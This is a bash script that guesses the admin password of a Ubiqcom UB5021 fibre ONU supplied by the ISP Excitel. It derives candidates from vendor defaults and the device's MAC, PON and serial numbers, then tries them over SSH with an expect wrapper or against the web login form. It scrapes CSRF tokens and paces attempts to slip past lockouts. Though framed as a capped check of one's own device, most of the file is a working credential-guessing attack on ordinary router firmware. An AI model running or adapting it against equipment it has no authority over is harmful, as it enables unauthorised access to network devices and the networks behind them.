#!/usr/bin/env bash
# guess-onu.sh — targeted credential test for the UB5021, derived from its label.
#
#   ./guess-onu.sh list         # show the candidate set, change nothing
#   ./guess-onu.sh ssh  -y      # test over IPv6 link-local (dropbear)
#   ./guess-onu.sh web  -y      # test the web UI (3 tries / 70s, slow)
#
# Portability: written for bash 3.2 (the /bin/bash that ships with macOS).
# No ${var,,} / ${var^^} / mapfile. Works on bash 4/5 too.
#
# Deliberately NOT a wordlist attack: candidates are derived from this device's
# own identifiers plus published vendor/ISP defaults. Hard cap, paced, stops on
# first success.
set -u

MODE="${1:-list}"
CONFIRM="${2:-}"
LL="${LL:-}"
IP="${IP:-}"
DELAY="${DELAY:-2}"        # seconds between SSH attempts
MAX="${MAX:-250}"          # hard cap on attempts
ROOT="$(cd "$(dirname "$0")/.." && pwd)"; OUT="$ROOT/captures/capture-guess"; mkdir -p "$OUT"

lc() { printf '%s' "$1" | tr 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' 'abcdefghijklmnopqrstuvwxyz'; }

# ---------------------------------------------------------------- candidates
cand=''
add() {
  local x
  for x in "$@"; do
    [ -n "$x" ] && cand="$cand$x
"
  done
}

# 1. label literals / what the sticker actually says
add user password Password admin root admin123 root123 1234 12345 123456 12345678 123456789
add admin@123 root@123 adminadmin rootroot administrator
# 2. vendor + ISP names
add ubiqcom UBIQCOM Ubiqcom ubi@123 Ubiqcom@123 excitel Excitel EXCITEL excitel123
add exc@123 Exc@123 EXC@123 excitel@123 Excitel@123 ftth FTTH ftth123 gpon GPON
ID_A=${WIFI_ID_A:-aaaa}; ID_B=${WIFI_ID_B:-bbbb}
add "EXCITEL_$ID_A" "Excitel_$ID_A" "Excitel_$ID_B" "excitel_$ID_A"
# 3. model strings
add UB5021 ub5021 UB5021GVWD ub5021gvwd UB5021-GVWD GVWD ub5021gvw UB5021GVWDD
# 4. hardware identifiers straight off the label
MAC=${ONU_MAC:-F4BDB9AABB89}; WMAC=${ONU_WMAC:-F4BDB9AABB92}
PON=${ONU_PON:-GPON00000000}; SN=${ONU_SN:-VSDUB00000000000}
add "$MAC" "$(lc "$MAC")" "$WMAC" "$(lc "$WMAC")"
add "${MAC: -4}" "${MAC: -6}" "${MAC: -8}" "${MAC:4:8}" "${MAC:6:6}"
add "${WMAC: -4}" "${WMAC: -6}" "${WMAC: -8}"
add "$PON" "$(lc "$PON")" "$SN" "$(lc "$SN")"
# PON serial variants derived from the local PON identifier
SER=${PON#*GPON}; SER=${SER#O}
add "GPON$SER" "gpon$SER" "$SER" "${SER:1}" "${SER:2}"
add "${SN: -4}" "${SN: -6}" "${SN: -8}" "${SN: -10}"
# 5. common derivations: prefix + identifier tail
for t in "${MAC: -4}" "${MAC: -6}" "${WMAC: -4}" "${SER: -4}" "${PON: -4}"; do
  add "admin$t" "Admin$t" "root$t" "user$t" "ubiqcom$t" "exc$t"
done
# 6. ISP-style: vendor + year/suffix
add Ubiqcom@2024 Ubiqcom@2025 ubiqcom@2024 excitel@2024 Exc@1234 exc@1234
add UBIQCOM123 ubiqcom123 Ubiqcom123
# 7. the subscriber's own Wi-Fi identifiers and common suffixes
add "$ID_A@main" "$ID_B@main" "$ID_A" "$ID_B" '@main' 'main' 'main@123' 'Main@123'
add 'admin@main' 'root@main' 'exc@main' 'Excitel@main' 'excitel@main'
add 'ubiqcom@main' 'Ubiqcom@main' 'UBIQCOM@main' 'user@main' 'admin1@main'
add 'ftth@main' 'FTTH@main' 'gpon@main' 'ub5021@main'

# dedupe, preserve order (no mapfile on bash 3.2)
CANDIDATES=$(printf '%s' "$cand" | awk 'NF && !seen[$0]++')
NCAND=$(printf '%s\n' "$CANDIDATES" | grep -c .)

# usernames to try, in priority order (user is forbidden on the web tier)
USERS="root user excitel admin"

# ---------------------------------------------------------------- display
if [ "$MODE" = "list" ]; then
  echo "candidate passwords: $NCAND"
  printf '%s\n' "$CANDIDATES" | sed 's/^/  /'
  echo
  echo "usernames: $USERS"
  echo "max attempts capped at $MAX (would be $(($NCAND * 4)) uncapped)"
  exit 0
fi

[ "$CONFIRM" = "-y" ] || { echo "refusing to run without -y"; exit 1; }
if [ "$MODE" = "ssh" ] || [ "$MODE" = "web" ]; then
  if [ -z "$LL" ] && [ -z "$IP" ]; then
    echo "usage: set LL (ssh) or IP (web)"
    exit 1
  fi
fi

# --------------------------------------------------- pick the right interface
# IPv6 link-local is L2-scoped, so we must be on the ONU's own segment: its LAN
# port or its Wi-Fi. Behind the extender (router mode) nothing will answer.
# Find which interface can see the ONU, from the IPv6 neighbour cache. Instant,
# generates no traffic. Matches the ONU's MAC or its EUI-64 link-local address.
# (ping6 is useless here: macOS repurposed -t/-w/-W, and nc -w hangs on v6.)
detect_if() {
  ndp -an 2>/dev/null | awk -v mac="<ONU-MAC>" \
    -v want="<ONU-LINK-LOCAL>" '
      /^Neighbor/ { next }
      tolower($2) == mac || index(tolower($1), want) { print $3; exit }
    '
}

LLBARE="${LL%%\%*}"
IF_DET=$(detect_if 2>/dev/null || true)
# Cache may be cold (no recent v6 traffic). Fall back to a fast HTTP probe per
# interface — curl honours --connect-timeout, unlike nc/ping6 here.
if [ -z "$IF_DET" ]; then
  for i in $(ifconfig -l); do
    case "$i" in lo*|gif*|stf*|utun*|awdl*|llw*|anpi*|bridge*|ap1) continue;; esac
    ifconfig "$i" 2>/dev/null | grep -q 'inet6 fe80' || continue
    code=$(curl -6 -g -s -o /dev/null -w '%{http_code}' --connect-timeout 2 --max-time 3 \
           "http://[${LLBARE}%25${i}]/" 2>/dev/null)
    [ -n "$code" ] && [ "$code" != "000" ] && { IF_DET="$i"; break; }
  done
fi
if [ -n "$IF_DET" ]; then
  LL="${LLBARE}%${IF_DET}"
  echo "ONU seen in neighbour cache on $IF_DET  ->  $LL"
else
  echo "WARNING: ONU is not in the IPv6 neighbour cache on any interface."
  echo "  Link-local is L2-scoped: you must be on the ONU's own segment."
  echo "    - cable into a LAN port on the ONU, or"
  echo "    - join the ONU's Wi-Fi (Excitel_$ID_A@main / Excitel_$ID_B@main)"
  echo "  Behind the extender (router mode) this cannot work — it NATs to a"
  echo "  different segment and link-local is never routed."
  echo "  Falling back to ${LL}. Every attempt will fail if that is wrong."
fi

# ---------------------------------------------------------------- ssh engine
EXP=$(mktemp -t onu-ssh) || exit 1
cat > "$EXP" <<'EXPECT'
set timeout 15
set host $env(ONU_HOST)
set user $env(ONU_USER)
set pw   $env(ONU_PW)
log_user 0
spawn ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password -o PubkeyAuthentication=no \
  -o NumberOfPasswordPrompts=1 -o ConnectTimeout=8 \
  $user@$host
expect {
  -re {(?i)(password|passphrase).*:}  { send -- "$pw\r"; exp_continue }
  -re {(?i)permission denied}        { exit 1 }
  -re {(?i)(locked|too many|denied)} { exit 5 }
  -re {([$#] |> *$)}                 { send -- "echo GUESSOK\r"
                                       expect { "GUESSOK" { exit 0 } timeout { exit 4 } } }
  timeout { exit 2 }
  eof     { exit 3 }
}
EXPECT

try_ssh() {
  ONU_HOST="$LL" ONU_USER="$1" ONU_PW="$2" /usr/bin/expect -f "$EXP" >/dev/null 2>&1
}

# ---------------------------------------------------------------- web engine
tok() {
  curl -s --max-time 8 "http://$IP/admin/login.asp" \
    | grep -oiE "name=['\"]csrftoken['\"] *value=['\"][A-Za-z0-9]+" \
    | grep -oE "[A-Za-z0-9]{16,}" | head -1
}

# 0 success | 1 bad pw | 2 locked | 3 unknown user
try_web() {
  local t b; t=$(tok)
  b=$(curl -s --max-time 10 -c "$OUT/jar.txt" -X POST "http://$IP/boaform/admin/formLogin" \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      --data-urlencode "username=$1" --data-urlencode "psd=$2" \
      --data "sec_lang=0&loginSelinit=0&ismobile=0&csrftoken=$t")
  printf '%s' "$b" > "$OUT/last-web.http"
  printf '%s' "$b" | grep -qiE 'thrice|please wait|relog'                  && return 2
  printf '%s' "$b" | grep -qiE 'invalid username'                          && return 3
  printf '%s' "$b" | grep -qiE 'bad password|wrong.*password|forbid'       && return 1
  return 0
}

# ---------------------------------------------------------------- run
attempts=0; found=""

for u in $USERS; do
  [ -n "$found" ] && break
  echo "== username: $u =="
  while IFS= read -r p; do
    [ -n "$found" ] && break
    [ -z "$p" ] && continue
    if [ "$attempts" -ge "$MAX" ]; then echo "  hit cap ($MAX) — stopping"; break 2; fi
    attempts=$((attempts+1))

    if [ "$MODE" = "ssh" ]; then
      try_ssh "$u" "$p"; rc=$?
      case $rc in
        0) found="$u / $p"; echo "  *** SUCCESS: $u / $p ***"; break;;
        5) echo "  lockout response — pausing 90s"; sleep 90;;
        2) echo "  timeout (network?)";;
      esac
      [ $((attempts % 10)) -eq 0 ] && echo "  ...$attempts tried"
      sleep "$DELAY"
    else
      try_web "$u" "$p"; rc=$?
      case $rc in
        0) found="$u / $p"; echo "  *** SUCCESS: $u / $p ***"; break;;
        2) echo "  cooldown — 70s"; sleep 70;;
        3) echo "  no such user ($u) — skipping username"; break;;
      esac
      [ $((attempts % 3)) -eq 0 ] && { echo "  (3 tries -> 70s cooldown)"; sleep 70; }
    fi
  done <<EOF
$CANDIDATES
EOF
done

rm -f "$EXP"
echo
echo "attempts: $attempts"
if [ -n "$found" ]; then
  echo "FOUND  $found"
  printf '%s\n' "$found" > "$OUT/found.txt"
  echo "Change it immediately; the ACS may revert it."
else
  echo "No match. The password is ISP-provisioned — see notes/lockout.md."
fi
